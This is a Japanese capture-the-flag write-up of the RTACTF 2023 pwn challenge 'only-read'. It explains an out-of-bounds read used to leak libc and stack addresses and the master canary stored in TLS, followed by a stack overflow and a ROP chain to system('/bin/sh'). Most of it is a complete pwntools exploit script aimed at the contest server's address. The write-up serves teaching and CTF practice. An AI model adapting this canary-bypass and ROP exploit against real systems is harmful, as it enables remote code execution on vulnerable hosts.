+++
title = "RTACTF 2023 - only-read"
date = 2023-03-22
description = "RTACTF 2023 - only-read"

[taxonomies]
tags = ["CTF", "Writeup", "Pwn", "OOB", "BOF", "Canary", "ROP"]
+++

- 問題ファイル: <https://rtactf.ctfer.jp/?#/task/a419886dbbbc345b81f7405ce298822c757903c82874084d899facedb7cb1f09>
	- 現在(2023/03/23 03:48)、スコアサーバーも問題サーバーも生きているが近いうちに落とされると思う

## TL;DR

- 自明なSBOFとスタック上の特定アドレスより小さいアドレスに対するAARがある
- AARを使ってlibcのアドレスとスタック上のアドレスをリークする
- libcの真上にMaster Canaryが存在しているのでこれを読み出す
- 自明なSBOFを利用して`__stack_chk_fail`をバイパスし、ROPでシェルをとる

## Prerequisite

- ROP

## Writeup

バイナリのソースコードは次の通り

```c
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define printval(_val)                                \
  {                                                   \
    size_t val = (_val);                              \
    char buf[0x20] = {}, *p = buf + sizeof(buf) - 1;  \
    *--p = '\n';                                      \
    do {                                              \
      *--p = '0' + (val % 10);                        \
      val /= 10;                                      \
    } while (val);                                    \
    write(STDOUT_FILENO, p, buf+sizeof(buf)-p-1);     \
  }                                                   \

#define getval(msg)                             \
  ({                                            \
    char buf[0x20] = {};                        \
    write(STDOUT_FILENO, msg, strlen(msg));     \
    read(STDIN_FILENO, buf, sizeof(buf)*0x20);  \
    atoll(buf);                                 \
  })

int main() {
  size_t array[10] = {};

  for (;;) {
    ssize_t index = getval("index: ");
    if (index >= 10) break;
    printval(array[index]);
  }

  return 0;
}

```

checksecの結果は次の通り

```txt
[*] '/home/xornet/CTF/rta2023/only-read/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

マクロを用いて入力と出力が実装されている。入力した`index`と「スタック上」の配列`array`に対して`array[index]`を出力するという仕様だが、ソースコードを見れば明らかなように10以上のインデックスにはアクセス出来ない。そもそも0から9の間の値も0で初期化されて以降、問題名が示すように何も書き込んでいないため0以外の値を見ることは通常はあり得ない。

しかし、マイナス方向に関しては`index`のチェックは特に存在しない。よってスタックより上に存在するアドレスの読み出しは行う事が出来る。雑に漁ると「実行バイナリ内のアドレス」と「libc付近のアドレス」と「スタック上のアドレス」がどれも見つかるのでgdbで値を覗き、適切なオフセットを足し引きして「バイナリの配置アドレス[^1]」と「libcの配置アドレス」と「`array`のアドレス」をリークする。

RIPを奪う方法としては`getval`に存在する自明なBOF(`sizeof(buf)*0x20*`で0x400バイトの書き込みが0x20バイトしか確保されていない`buf`に対して行える)が存在するのでROPを行う。しかし、checksecの結果からわかるようにStack Canaryが有効なのでこれをバイパスする必要がある。

`printval`はスタック上の値を覗く事が出来るが、先に述べた`index`に対する制限より`array[10]`以降は読めないことから、スタックの底にあるCanaryも読む事が出来ない。ここでかなり苦しんで結局わからなかったので[走者のmoraさんのWriteup](https://moraprogramming.hateblo.jp/entry/2023/03/21/222135)を初めとした下記参考文献にあげたような資料を読んだりしたところ、どうやらTLS領域という場所にCanaryの値が存在しているらしい(master canaryと呼ばれている)。

pwndbgのコマンドでこの辺が良い感じに生えてくれたら嬉しいと思いつつ、そんな事は無さそうだったので[Label the TLS in vmmap · Issue #1570 · pwndbg/pwndbg](https://github.com/pwndbg/pwndbg/issues/1570)を雑に読みながら、`search -8 <canary>`を打ったらlibcに真上に確保された領域の中にMaster Canaryが見つかった。というわけでlibcからの相対位置を特定し、既にリークが済んでいるlibcのアドレスに足すことでMaster Canaryのアドレスを特定する。

既に`array`のアドレスは既知であるから、ここより上部のアドレスを知っている箇所に関しては`array`に負のインデックスを指定することで`printval`で読み出しが出来る。そしてメモリ配置上ではlibcはスタックより上(アドレスが小さい方)にあるため、これでMaster Canaryの値を特定する事が出来る。後は`getval`のROPのペイロードに組み込んで送ればシェルが取れる。

ところで、「ローカルのUbuntu 22.04環境」と「配布されたDockerfileで作った問題環境」と「リモートの環境」においてlibcリークに用いるアドレスのオフセットが0x1000のオーダーで異なっており、前者2つはgdbで値を見て特定出来たが、後者を当てるために雑にブルートフォースを行った。

## Code

```python
"""
- * この問題では最大16-bit程度の総当り攻撃が許可されています。
- winが無い -> リターンアドレスにROPチェーンを書き込む
- Canaryが突破出来ませんが... -> なんかTLS(どこ?)とかいうところにあるらしい
"""


from pwn import remote, process, p64, ELF
import sys


args = sys.argv
DEBUG = True if "-d" in args else False

port = 13337 if DEBUG else 9004
host = "35.194.118.87" if not DEBUG else "localhost"

def exploit(libc_diff):
    sc = remote(host, port)

    def send(payload: bytes, sc=sc) -> None:
        sc.recvuntil(b"index: ")
        sc.sendline(payload)


    if DEBUG:
        input("[+] attach")


    addrs = {}
    rpg = {
        "pop_rdi": 0x001bc021,  # libc,
        "ret": 0x001bc02d  # libc
    }

    elf  = ELF("./chall")
    libc = ELF("./libc.so.6")


    addrs = {}

    # elf leak
    idx = -5
    send(str(idx).encode())
    res = sc.recvline().strip().decode()
    leak = int(res)
    elf_addr = leak -  (0x0000555555555272 -  0x555555554000)

    print(hex(elf_addr))
    addrs["elf"] = elf_addr

    # libc leak
    idx = -6
    send(str(idx).encode())
    res = sc.recvline().strip().decode()
    leak = int(res)
    # diff = (0x7f147dd7d040 - 0x7f147db0c000)  # my local env
    # diff = (0x7f147dd7d040 - 0x7f147db0c000 - 0xa000)  # my docker env
    diff = (0x7f147dd7d040 - 0x7f147db0c000 - 0xb000)  # remote (sry brute-forcing...)
    libc_addr = leak - diff

    print(hex(libc_addr))
    addrs["libc"] = libc_addr
    addrs["binsh"] = next(libc.search(b"/bin/sh")) + libc_addr
    addrs["system"] = libc.symbols["system"] + libc_addr

    # stack (array) leak
    #         leak in stack      - array address  = diff
    # test 1: 0x00007fff9b2691b0 - 0x7fff9b269130 = 0x80
    # test 2: 0x00007ffda94c1a10 - 0x7ffda94c1990 = 0x80
    # test 3: 0x00007ffe387e0b50 - 0x7ffe387e0ad0 = 0x80
    # !!!!!!!

    idx = -10
    send(str(idx).encode())
    res = sc.recvline().strip().decode()
    leak = int(res)
    array_addr = leak - 0x80
    print(hex(array_addr))
    addrs["array"] = array_addr

    # canary leak
    # test n: master canary address - libc address = diff
    # test 1: 0x7f5eadf5d768 - 0x7f5eadf60000 = -0x2898
    # test 2: 0x7f1840472768 - 0x7f1840475000 = -0x2898
    # ok (but I have to leak stack address)

    canary_addr = libc_addr - 0x2898
    print(hex(canary_addr))

    if DEBUG:
        input("[+] check addresses")

    addrs["canary"] = canary_addr
    diff = addrs["canary"] - addrs["array"]
    idx = diff // 0x8
    send(str(idx).encode())
    res = sc.recvline().strip().decode()
    leak = int(res)
    print(hex(leak))
    assert leak & 0xff == 0

    # BOF
    payload = b"12345678"
    payload += b"\x00" * 0x8 * 0x3
    payload += b"\x00\x10" + b"\x00" * 0x6  # ???
    payload += p64(leak)
    payload += p64(0)  # old-rbp
    payload += p64(rpg["pop_rdi"] + addrs["libc"])
    payload += p64(addrs["binsh"])
    payload += p64(rpg["ret"] + addrs["libc"])
    payload += p64(addrs["system"])

    send(payload)

    sc.interactive()



if __name__ == "__main__":
    exploit(0)
    exit()
    # search valid offset
    for i in range(0x10):
        diff = 0x1000 * i
        print(f"[+] testing {diff:x}")
        try:
            exploit(diff)
            print("ok")
        except EOFError:
            print("fail")

# RTACTF{r3m3mb3r_m4st3r_canaryyyyyy......}
# 17529.89 sec
```

## Flag

`RTACTF{r3m3mb3r_m4st3r_canaryyyyyy......}`

## References

- [RTACTF 2で走者として走りました🏃 - 欣快の至り](https://moraprogramming.hateblo.jp/entry/2023/03/21/222135)
	- 走者Writeup
- [Master Canary Forging: 新しいスタックカナリア回避手法の提案 by 小池 悠生 - CODE BLUE 2015](https://www.slideshare.net/codeblue_jp/master-canary-forging-by-code-blue-2015)
- [【pwn 11.2】 MonoidOperator - SECCON CTF 2019 - newbie dive into binary](https://smallkirby.hatenablog.com/entry/2019/11/06/031902#4-MasterCanaryTLS%E3%81%AEleak)

---

[^1]: ROPガジェットのためにELFの配置先をリークしておいたが、`pop rdi; ret;`すら存在しなかったので残念ながら役に立つことは無かった
